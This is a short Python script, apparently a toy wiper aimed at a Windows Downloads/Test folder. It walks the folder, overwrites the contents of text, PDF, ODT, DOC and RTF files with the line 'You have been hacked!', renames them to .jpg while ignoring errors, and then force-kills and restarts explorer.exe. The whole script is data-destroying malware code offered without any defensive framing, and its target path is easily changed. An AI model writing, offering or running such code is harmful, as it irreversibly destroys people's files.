import os
import glob
from os import getenv, system

spath = "C:/Users/[username]/Downloads/Test"
os.chdir(spath)


for roots, dirs, files in os.walk(spath):
    for fi in files:
        if fi.endswith((".txt", ".pdf", ".odt")):
            try:
                new_file = open(fi, mode="w", encoding="utf-8")
                new_file.write("You have been hacked!")
                new_file.close()
                os.rename(fi, fi[:-3] + "jpg")
            except:
                continue
        elif fi.endswith((".odt", ".doc", ".rtf")):
            try:
                new_file = open(fi, mode="w", encoding="utf-8")
                new_file.write("You have been hacked!")
                new_file.close()
                os.rename(fi, fi[:-3] + "jpg")
            except:
                continue

system("taskkill /f /IM explorer.exe")
system("start C:/Windows/explorer.exe")
